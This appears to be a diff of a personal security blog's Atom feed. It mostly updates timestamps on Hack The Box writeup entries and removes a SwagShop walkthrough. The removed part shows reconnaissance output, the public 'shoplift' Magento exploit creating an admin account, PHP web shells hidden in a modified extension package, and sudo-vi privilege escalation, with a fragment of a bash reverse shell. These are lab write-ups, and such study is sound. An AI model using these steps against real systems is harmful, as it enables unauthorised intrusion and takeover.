 &lt;p&gt;Today they retired my favorite box so far, Craft. This box was very real world in the chain of mistakes that lead to each exploit. The beer theme and Silicon Valley theme were also awesome. A+ box, and here’s the writeup.&lt;/p&gt;
@@ -955,7 +1060,7 @@ Last login: Tue Aug 13 18:48:35 2019 from ::1
   &lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation&quot;&gt;https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.vaultproject.io/docs/commands/ssh.html&quot;&gt;https://www.vaultproject.io/docs/commands/ssh.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="Python" /><category term="Code Execution" /><category term="Gogs" /><category term="Git" /><category term="Vault" /><summary type="html"></summary></entry><entry><title type="html">Bad USB Botnet</title><link href="http://0.0.0.0:4000/bad-usb-botnet/" rel="alternate" type="text/html" title="Bad USB Botnet" /><published>2019-12-06T00:00:00+00:00</published><updated>2020-05-11T02:12:40+00:00</updated><id>http://0.0.0.0:4000/Bad-USB-Botnet</id><content type="html" xml:base="http://0.0.0.0:4000/bad-usb-botnet/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/BYOB_ASCII.png&quot; alt=&quot;boot_BYOB&quot; /&gt;&lt;/p&gt;
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="Python" /><category term="Code Execution" /><category term="Gogs" /><category term="Git" /><category term="Vault" /><summary type="html"></summary></entry><entry><title type="html">Bad USB Botnet</title><link href="http://0.0.0.0:4000/bad-usb-botnet/" rel="alternate" type="text/html" title="Bad USB Botnet" /><published>2019-12-06T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/Bad-USB-Botnet</id><content type="html" xml:base="http://0.0.0.0:4000/bad-usb-botnet/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/BYOB_ASCII.png&quot; alt=&quot;boot_BYOB&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;This was a semester long project for California State University Sacramento’s Computer System Attacks and Countermeasures (CSC 154). I really enjoyed working on this project, and wanted to archive it on my site, so here it is.&lt;/p&gt;
 
@@ -1207,7 +1312,7 @@ Last login: Tue Aug 13 18:48:35 2019 from ::1
   &lt;li&gt;&lt;a href=&quot;https://github.com/kbeflo/digispark-payloads&quot;&gt;DigiSpark Payloads&lt;/a&gt;.&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://digistump.com/board/index.php?topic=2612.0&quot;&gt;DigiSpark Apple Keyboard Mod Explanation&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://github.com/chris408/digispark-usbkey-board/blob/master/usbconfig.h&quot;&gt;DigiSpark Apple Keyboard &lt;code class=&quot;highlighter-rouge&quot;&gt;usbconfig.h&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="Security" /><category term="BadUSB" /><category term="Botnet" /><category term="DigiSpark" /><category term="BYOB" /><category term="Build Your Own Botnet" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Jarvis</title><link href="http://0.0.0.0:4000/hack-the-box-jarvis/" rel="alternate" type="text/html" title="Hack The Box - Jarvis" /><published>2019-11-09T00:00:00+00:00</published><updated>2019-12-08T03:02:43+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-jarvis</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-jarvis/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/badge.png&quot; alt=&quot;Hack The Box Writeup&quot; /&gt;&lt;/p&gt;
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="Security" /><category term="BadUSB" /><category term="Botnet" /><category term="DigiSpark" /><category term="BYOB" /><category term="Build Your Own Botnet" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Jarvis</title><link href="http://0.0.0.0:4000/hack-the-box-jarvis/" rel="alternate" type="text/html" title="Hack The Box - Jarvis" /><published>2019-11-09T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-jarvis</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-jarvis/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/badge.png&quot; alt=&quot;Hack The Box Writeup&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
 
@@ -1607,7 +1712,7 @@ d41d8cd98f00b204e9800998ecf84271
   &lt;li&gt;&lt;a href=&quot;https://security.stackexchange.com/questions/212427/why-doesnt-my-systemctl-command-work&quot;&gt;https://security.stackexchange.com/questions/212427/why-doesnt-my-systemctl-command-work&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html&quot;&gt;https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="phpMyAdmin" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Haystack</title><link href="http://0.0.0.0:4000/hack-the-box-haystack-writeup/" rel="alternate" type="text/html" title="Hack The Box - Haystack" /><published>2019-11-02T00:00:00+00:00</published><updated>2019-11-10T16:52:01+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-haystack</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-haystack-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="phpMyAdmin" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Haystack</title><link href="http://0.0.0.0:4000/hack-the-box-haystack-writeup/" rel="alternate" type="text/html" title="Hack The Box - Haystack" /><published>2019-11-02T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-haystack</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-haystack-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;
 &lt;p&gt;Haystack is retired and now we can talk about it. At first I was fairly frustrated with this box. I really didn’t enjoy it much at the beginning, but after all was said and done I did have a bit of fun. The Spanish language was a nice twist, we have to remember there are a lot of systems out there that aren’t in English. I learned a bit about the ELK stack, which before this I knew next to nothing about. All in all it was a fairly good box.&lt;/p&gt;
@@ -1835,7 +1940,7 @@ filter {
   &lt;li&gt;&lt;a href=&quot;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&quot;&gt;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/168291&quot;&gt;https://www.anquanke.com/post/id/168291&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://grokdebug.herokuapp.com/&quot;&gt;https://grokdebug.herokuapp.com/&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="Elasticsearch" /><category term="ELK" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Writeup</title><link href="http://0.0.0.0:4000/hack-the-box-writeup-4-writeup/" rel="alternate" type="text/html" title="Hack The Box - Writeup" /><published>2019-10-19T00:00:00+00:00</published><updated>2019-10-24T01:35:29+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-writeup</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-writeup-4-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/writeup/badge.png&quot; alt=&quot;Hack The Box Writeup&quot; /&gt;&lt;/p&gt;
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="Elasticsearch" /><category term="ELK" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Writeup</title><link href="http://0.0.0.0:4000/hack-the-box-writeup-4-writeup/" rel="alternate" type="text/html" title="Hack The Box - Writeup" /><published>2019-10-19T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-writeup</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-writeup-4-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/writeup/badge.png&quot; alt=&quot;Hack The Box Writeup&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
 
@@ -1980,177 +2085,4 @@ bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quo
 
 &lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
 
-&lt;p&gt;Writeup was a quick and easy box. The initial exploit for the CMS was really fun to watch run, as others have said it felt like The Matrix. After that, the privilege escalation had me a little stumped until I heard about pyspy, then it was fairly easy since the &lt;code class=&quot;highlighter-rouge&quot;&gt;PATH&lt;/code&gt; variable stuck out like a soar thumb. It was still fun to figure out how to exploit that after discovery though, and getting the root shell was rather satisfying.&lt;/p&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="CMS Made Simple" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - SwagShop</title><link href="http://0.0.0.0:4000/hack-the-box-swagshop-writeup/" rel="alternate" type="text/html" title="Hack The Box - SwagShop" /><published>2019-09-29T00:00:00+00:00</published><updated>2019-09-30T23:12:34+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-swagshop</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-swagshop-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/badge.png&quot; alt=&quot;Hack The Box SwagShop&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
-&lt;p&gt;SwagShop was an easy but fun box for me. When this box was active it was also the only way you could buy t-shirts and stickers (now HTB’s shop is publicly available). So, without further blabering, you can read the writeup below.&lt;/p&gt;
-
-&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sVC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; nmap_SwagShop.txt 10.10.10.140
-&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-11 16:30 EDT
-Nmap scan report for 10.10.10.140
-Host is up (0.41s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;| ssh-hostkey:
-|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
-|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
-|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Home page
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Service Info: OS: Linux;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;CPE: cpe:/o:linux:linux_kernel
-&lt;span class=&quot;go&quot;&gt;
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 34.88 seconds
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;From the above output we can see that ports, &lt;strong&gt;22&lt;/strong&gt;, and &lt;strong&gt;80&lt;/strong&gt;, are open. So lets checkout what’s going on with port &lt;strong&gt;80&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;port-80-apache--magneto&quot;&gt;Port 80: Apache &amp;amp; Magneto&lt;/h2&gt;
-&lt;p&gt;When we browse to SwagShop’s main web port, we see a Magneto shop is running. Let’s see if we can find any interesting files using some http enumeration.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/1.png&quot; alt=&quot;Magneto running on SwagShop&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;http-enumeration-dirbuster&quot;&gt;HTTP Enumeration: dirbuster&lt;/h3&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Tools/dirsearch#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 dirsearch.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.140 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; ,php,txt
-&lt;span class=&quot;go&quot;&gt; _|. _ _  _  _  _ _|_    v0.3.8
-(_||| _) (/_(_|| (_| )
-
-Extensions: , php, txt | HTTP method: get | Threads: 10 | Wordlist size: 6777
-
-Error Log: /root/Tools/dirsearch/logs/errors-19-07-03_17-23-54.log
-
-Target: http://10.10.10.140
-
-[17:23:56] Starting:
-[17:24:00] 200 -   16KB - /
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[17:25:42] 301 -  310B  - /app  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/app/
-&lt;span class=&quot;go&quot;&gt;[17:25:43] 200 -    5KB - /app/etc/config.xml
-[17:25:43] 200 -    2KB - /app/etc/local.xml
-[17:25:43] 200 -    9KB - /app/etc/local.xml.additional
-[17:25:43] 200 -    2KB - /app/etc/local.xml.template
-[17:26:24] 200 -    0B  - /cron.php
-[17:26:25] 200 -  717B  - /cron.sh
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[17:26:35] 301 -  317B  - /downloader  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/downloader/
-&lt;span class=&quot;go&quot;&gt;[17:26:36] 200 -  464B  - /downloader/connect.cfg
-[17:26:40] 200 -  343KB - /downloader/cache.cfg
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[17:26:42] 301 -  313B  - /errors  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/errors/
-&lt;span class=&quot;go&quot;&gt;[17:26:42] 200 -    2KB - /errors/
-[17:26:45] 200 -    1KB - /favicon.ico
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[17:27:05] 301 -  315B  - /includes  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/includes/
-&lt;span class=&quot;go&quot;&gt;[17:27:05] 200 -  946B  - /includes/
-[17:27:07] 200 -   16KB - /index.php
-[17:27:11] 200 -   44B  - /install.php
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[17:27:15] 301 -  309B  - /js  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/js/
-&lt;span class=&quot;gp&quot;&gt;[17:27:16] 301 -  318B  - /js/tiny_mce  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/js/tiny_mce/
-&lt;span class=&quot;go&quot;&gt;[17:27:16] 200 -    4KB - /js/tiny_mce/
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[17:27:19] 301 -  310B  - /lib  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/lib/
-&lt;span class=&quot;go&quot;&gt;[17:27:20] 200 -   10KB - /LICENSE.txt
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[17:27:35] 301 -  312B  - /media  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/media/
-&lt;span class=&quot;go&quot;&gt;[17:28:04] 200 -  886B  - /php.ini.sample
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[17:28:16] 301 -  314B  - /pkginfo  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/pkginfo/
-&lt;span class=&quot;go&quot;&gt;[17:28:35] 403 -  301B  - /server-status/
-[17:28:35] 403 -  300B  - /server-status
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[17:28:39] 301 -  312B  - /shell  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/shell/
-&lt;span class=&quot;go&quot;&gt;[17:28:40] 200 -    2KB - /shell/
-[17:28:43] 200 -  571KB - /RELEASE_NOTES.txt
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[17:28:47] 301 -  311B  - /skin  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/skin/
-&lt;span class=&quot;gp&quot;&gt;[17:29:19] 301 -  310B  - /var  -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;http://10.10.10.140/var/
-&lt;span class=&quot;go&quot;&gt;[17:29:19] 200 -    4KB - /var/cache/
-[17:29:19] 200 -  755B  - /var/backups/
-
-Task Completed
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A number of things catch the eye here. We can see that the &lt;code class=&quot;highlighter-rouge&quot;&gt;session&lt;/code&gt; directory is exposed, and that Magneto is configured to use the file system for sessions rather than the database. Attempting to hijack the admin sessions did not work in this case though. Perhaps someone may have had success with this method, but I did not. Another interesting note is that we’re able to see the MySQL root password by browsing to &lt;code class=&quot;highlighter-rouge&quot;&gt;/app/etc/local.xml&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/mysql_root.png&quot; alt=&quot;SwagShop MySQL root credentials&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Store these away in the event that it will help with privilege escalation later on.&lt;/p&gt;
-
-&lt;p&gt;We find the file &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.140/RELEASE_NOTES.txt&lt;/code&gt; which allows us to determine the Magneto version being run. That should help us determine if there’s a public exploit available that we can leverage.&lt;/p&gt;
-
-&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;==== 1.7.0.2 ====
-
-=== Fixes ===
-Fixed: Security vulnerability in Zend_XmlRpc - http://framework.zend.com/security/advisory/ZF2012-01
-Fixed: PayPal Standard does not display on frontend during checkout with some merchant countries
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;That’s a pretty old version of Magneto. When we search for public exploits we find an unauthenticated exploit known as &lt;strong&gt;&lt;a href=&quot;https://github.com/incredibleindishell/Magento-shoplift-python-exploit&quot;&gt;shoplift&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
-
-&lt;p&gt;This exploit worked perfectly, with one slight modification. Since the site doesn’t appear to be using &lt;code class=&quot;highlighter-rouge&quot;&gt;modrewrite&lt;/code&gt; we must include &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt; line 7 of the exploit, which sets the target.
-`&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Desktop#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python shoplift.py
-&lt;span class=&quot;go&quot;&gt;WORKED
-Check http://10.10.10.140/index.php/admin with creds forme:forme
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We’ve now created an admin user &lt;code class=&quot;highlighter-rouge&quot;&gt;forme&lt;/code&gt;, with password &lt;code class=&quot;highlighter-rouge&quot;&gt;forme&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/admin_panel.png&quot; alt=&quot;Magneto Admin Dashboard.&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
-
-&lt;p&gt;In order to move towards the user flag from the admin panel of Magneto, we need a method for uploading files. Out of the box Magneto doesn’t provide a file manager, so we need to upload a package of our own through the “Magneto Connect Manager” at the url &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.140/downloader/&lt;/code&gt;, which we now have access to.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/downloader.png&quot; alt=&quot;Magneto Connect Manager.&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Because creating a package from scratch proved to be a little finicky for me, I chose to upload my php shell code into an existing package called &lt;strong&gt;&lt;a href=&quot;https://github.com/sendwithus/extension-magento/blob/master/dist/Sendwithus_Mail-1.0.2.tgz&quot;&gt;sendwithus&lt;/a&gt;&lt;/strong&gt;. To do this we simply extract the package and add our shell code.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/shells.png&quot; alt=&quot;Shell code in modified Magneto package.&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Generate our checksum for the shells.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;x@wartop:~/Desktop/HTB_Swagshop$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;shell.php &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;rshell.php
-&lt;span class=&quot;go&quot;&gt;f2013115840359271c1f3e4661091efa  shell.php
-55c320877fe1ecda130c33ecdf3e95a1  rshell.php
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Then we modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;package.xml&lt;/code&gt; to also include our shells.&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;file&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Mail.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hash=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;999a50a911486c5c48a5c43d5a072220&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;file&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;shell.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hash=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;f2013115840359271c1f3e4661091efa&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;file&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rshell.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hash=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;5f8af08f753e5d318d307e75ad91c039&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/package.png&quot; alt=&quot;Uploading Magneto package with our shell code.&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Once we’ve uploaded the package, we can access &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.php&lt;/code&gt;, which is the &lt;a href=&quot;https://github.com/flozz/p0wny-shell&quot;&gt;p0wny&lt;/a&gt; web shell. All we need to do in order to gain the user flag is navigate to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/harris&lt;/code&gt; directory and print it to the screen.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/user.png&quot; alt=&quot;user.txt flag.&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
-
-&lt;p&gt;We can see by browsing around a bit, or by running &lt;a href=&quot;https://github.com/diego-treitos/linux-smart-enumeration&quot;&gt;Linux Smart Enumeration&lt;/a&gt; that we’re able to read the contents of the &lt;code class=&quot;highlighter-rouge&quot;&gt;sudoers&lt;/code&gt; file. I was so eager to read the contents of the file that I copied it to the web directory before even launching my reverse shell.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/copy_sudoers.png&quot; alt=&quot;copy sudoers.&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/swagshop/view_sudoers.png&quot; alt=&quot;view sudoers.&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;One line sticks out in the sudoers file as an easy route to privilege escalation &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data ALL=NOPASSWD:/usr/bin/bi /var/www/html/*&lt;/code&gt;. Basically, without a password the user &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; is able to run &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt; in the web server directory.&lt;/p&gt;
-
